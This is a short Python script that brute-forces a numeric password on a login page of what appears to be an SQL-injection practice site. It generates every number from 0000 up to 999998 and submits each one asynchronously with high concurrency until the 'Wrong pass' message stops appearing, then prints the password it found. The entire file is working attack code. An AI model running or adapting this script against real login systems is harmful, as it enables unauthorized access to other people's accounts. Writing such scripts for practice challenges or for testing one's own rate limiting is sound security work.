import requests
import aiohttp
import asyncio
import time


#https://www.zixem.altervista.org/SQLi/login_lvl5.php

async def brute(wordlist):
    conn =  aiohttp.TCPConnector(limit=1000)
    url = 'https://www.zixem.altervista.org/SQLi/login_do.php?'
    async with aiohttp.ClientSession(connector=conn) as req:
        for password in wordlist:
            data = {'pass': password}
            async with req.get(url, params=data) as res:
                res = str(await res.read())


                if "Wrong pass"  in res:
                    print(f"Wrong password: {password}")
                else:
                    print(f"Password is : {password}")
                    break


if __name__ == '__main__':
    start_time = time.monotonic()

    wordlist = []
    for i in range(0000, 999999):
        wordlist.append(f'{i:04}')

    loop = asyncio.get_event_loop()
    loop.run_until_complete(brute(wordlist))

    print(f"Time taken: {time.monotonic() - start_time}")
